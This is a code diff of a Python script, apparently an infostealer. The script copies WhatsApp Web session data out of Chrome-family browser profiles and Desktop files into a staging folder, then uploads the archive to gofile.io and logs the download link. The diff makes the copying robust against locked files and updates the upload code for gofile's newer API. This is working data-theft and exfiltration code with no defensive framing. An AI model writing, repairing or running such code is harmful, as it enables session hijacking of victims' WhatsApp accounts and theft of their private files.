@@ -89,16 +89,78 @@ def load_config():
     }
 
 
-def copytree_safe(src: Path, dst: Path):
-    try:
-        if dst.exists():
-            shutil.rmtree(dst, ignore_errors=True)
-        shutil.copytree(src, dst)
-        return True, None
-    except PermissionError as e:
-        return False, f"locked: {e}"
-    except Exception as e:
-        return False, str(e)
+def copy_tree_robust(src: Path, dst: Path):
+    """Copy tree, skipping individual files that fail (LOCK, in-use, permission)."""
+    skipped = []
+    copied = 0
+    for root, dirs, files in os.walk(src):
+        rel = Path(root).relative_to(src)
+        dst_dir = dst / rel
+        try:
+            dst_dir.mkdir(parents=True, exist_ok=True)
+        except Exception as e:
+            skipped.append(f"{rel}: mkdir {e}")
+            continue
+        for fname in files:
+            sfile = Path(root) / fname
+            dfile = dst_dir / fname
+            try:
+                shutil.copy2(sfile, dfile)
+                copied += 1
+            except Exception as e:
+                skipped.append(f"{rel}/{fname}: {e}")
+    return copied, skipped
+
+
+def collect_chrome(stage: Path, manifest: dict, browsers: list):
+    for bname in browsers:
+        root = CHROME_ROOTS.get(bname)
+        log(f"chrome root {bname}: {root} exists={bool(root and root.exists())}")
+        if not root or not root.exists():
+            continue
+
+        for profile in root.iterdir():
+            if not profile.is_dir():
+                continue
+            if profile.name in SKIP_PROFILES:
+                continue
+            if profile.name != "Default" and not profile.name.startswith("Profile "):
+                continue
+
+            entry = {"type": "chrome", "browser": bname, "profile": profile.name}
+            dst_profile = stage / "chrome" / bname / profile.name
+            dst_profile.mkdir(parents=True, exist_ok=True)
+
+            total_copied = 0
+            total_skipped = []
+
+            for sub in WA_SUBPATHS:
+                src_sub = profile / sub
+                if not src_sub.exists():
+                    continue
+                dst_sub = dst_profile / sub
+                if src_sub.is_dir():
+                    copied, skipped = copy_tree_robust(src_sub, dst_sub)
+                    total_copied += copied
+                    total_skipped.extend([f"{sub}/{s}" for s in skipped])
+                    log(f"chrome {bname}/{profile.name}/{sub} copied={copied} skipped={len(skipped)}")
+                else:
+                    ok, err = _copy_file(src_sub, dst_sub)
+                    if ok:
+                        total_copied += 1
+                    else:
+                        total_skipped.append(f"{sub}: {err}")
+
+            if total_copied > 0:
+                entry["status"] = "ok"
+                entry["files_copied"] = total_copied
+                if total_skipped:
+                    entry["warnings"] = total_skipped[:20]  # cap biar manifest nggak blow up
+            else:
+                entry["status"] = "skipped"
+                entry["reason"] = "no files copied"
+
+            manifest["targets"].append(entry)
 
 
 def collect_desktop(stage: Path, manifest: dict):
@@ -122,50 +184,6 @@ def collect_desktop(stage: Path, manifest: dict):
             shutil.rmtree(dst, ignore_errors=True)
     manifest["targets"].append(entry)
 
-
-def collect_chrome(stage: Path, manifest: dict, browsers: list):
-    for bname in browsers:
-        root = CHROME_ROOTS.get(bname)
-        log(f"chrome root {bname}: {root} exists={bool(root and root.exists())}")
-        if not root or not root.exists():
-            continue
-
-        for profile in root.iterdir():
-            if not profile.is_dir():
-                continue
-            if profile.name in SKIP_PROFILES:
-                continue
-            if profile.name != "Default" and not profile.name.startswith("Profile "):
-                continue
-
-            entry = {"type": "chrome", "browser": bname, "profile": profile.name}
-            dst_profile = stage / "chrome" / bname / profile.name
-            dst_profile.mkdir(parents=True, exist_ok=True)
-
-            copied_any = False
-            for sub in WA_SUBPATHS:
-                src_sub = profile / sub
-                if not src_sub.exists():
-                    continue
-                dst_sub = dst_profile / sub
-                ok, err = copytree_safe(src_sub, dst_sub) if src_sub.is_dir() \
-                    else _copy_file(src_sub, dst_sub)
-                if ok:
-                    copied_any = True
-                    log(f"chrome {bname}/{profile.name}/{sub} ok")
-                else:
-                    entry["status"] = "partial"
-                    entry.setdefault("warnings", []).append(f"{sub}: {err}")
-                    log(f"chrome {bname}/{profile.name}/{sub} fail: {err}")
-
-            if "status" not in entry:
-                entry["status"] = "ok" if copied_any else "skipped"
-                if not copied_any:
-                    entry["reason"] = "no whatsapp data"
-
-            manifest["targets"].append(entry)
-
-
 def _copy_file(src: Path, dst: Path):
     try:
         dst.parent.mkdir(parents=True, exist_ok=True)
@@ -179,17 +197,26 @@ def upload_to_gofile(path: Path, retries: int, delay: int):
     log(f"upload start: {path} size={path.stat().st_size if path.exists() else 'MISSING'}")
     for i in range(retries):
         try:
-            server = requests.get(
-                "https://api.gofile.io/getServer", timeout=15
-            ).json()["data"]["server"]
+            # gofile API v2: /servers (plural), returns data.servers[]
+            r = requests.get("https://api.gofile.io/servers", timeout=15)
+            log(f"servers status={r.status_code} body={r.text[:200]}")
+            servers = r.json()["data"]["servers"]
+            if not servers:
+                raise RuntimeError("no servers returned")
+            server = servers[0]["name"]
             log(f"gofile server: {server} (attempt {i+1})")
+
             with open(path, "rb") as fh:
-                r = requests.post(
-                    f"https://{server}.gofile.io/uploadFile",
+                up = requests.post(
+                    f"https://{server}.gofile.io/contents/uploadfile",
                     files={"file": fh},
                     timeout=300
-                ).json()
-            link = r["data"]["downloadPage"]
+                )
+            log(f"upload status={up.status_code} body={up.text[:300]}")
+            data = up.json()
+            if data.get("status") != "ok":
+                raise RuntimeError(f"gofile rejected: {data}")
+            link = data["data"]["downloadPage"]
             log(f"upload ok: {link}")
             return link
         except Exception:
